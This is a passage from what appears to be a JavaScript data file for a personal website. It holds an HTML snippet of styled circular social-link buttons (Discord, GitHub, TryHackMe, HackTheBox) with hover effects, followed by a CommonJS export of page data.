                <a href="https://discord.gg/HcSrc9WG" target="_blank" style="display: flex; align-items: center; justify-content: center; width: 60px; height: 60px; border: 2px solid rgba(255, 0, 110, 0.4); border-radius: 50%; cursor: pointer; transition: all 0.3s ease; text-decoration: none;" onmouseover="this.style.borderColor='#ff006e'; this.style.boxShadow='0 0 20px rgba(255, 0, 110, 0.5)';" onmouseout="this.style.borderColor='rgba(255, 0, 110, 0.4)'; this.style.boxShadow='none';">
                    <span style="font-size: 28px;">🎮</span>
                </a>
                <a href="https://github.com/niktab121" target="_blank" style="display: flex; align-items: center; justify-content: center; width: 60px; height: 60px; border: 2px solid rgba(255, 0, 110, 0.4); border-radius: 50%; cursor: pointer; transition: all 0.3s ease; text-decoration: none;" onmouseover="this.style.borderColor='#ff006e'; this.style.boxShadow='0 0 20px rgba(255, 0, 110, 0.5)';" onmouseout="this.style.borderColor='rgba(255, 0, 110, 0.4)'; this.style.boxShadow='none';">
                    <span style="font-size: 28px;">🐙</span>
                </a>
                <a href="https://tryhackme.com/p/K1llTh3m" target="_blank" style="display: flex; align-items: center; justify-content: center; width: 60px; height: 60px; border: 2px solid rgba(255, 0, 110, 0.4); border-radius: 50%; cursor: pointer; transition: all 0.3s ease; text-decoration: none;" onmouseover="this.style.borderColor='#ff006e'; this.style.boxShadow='0 0 20px rgba(255, 0, 110, 0.5)';" onmouseout="this.style.borderColor='rgba(255, 0, 110, 0.4)'; this.style.boxShadow='none';">
                    <span style="font-size: 28px;">🚩</span>
                </a>
                <a href="https://app.hackthebox.com/users/2569792" target="_blank" style="display: flex; align-items: center; justify-content: center; width: 60px; height: 60px; border: 2px solid rgba(255, 0, 110, 0.4); border-radius: 50%; cursor: pointer; transition: all 0.3s ease; text-decoration: none;" onmouseover="this.style.borderColor='#ff006e'; this.style.boxShadow='0 0 20px rgba(255, 0, 110, 0.5)';" onmouseout="this.style.borderColor='rgba(255, 0, 110, 0.4)'; this.style.boxShadow='none';">
                    <span style="font-size: 28px;">📦</span>
                </a>
            </div>
        `
    }
};

// Export for use in JavaScript
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { pageData, fullPosts };
}
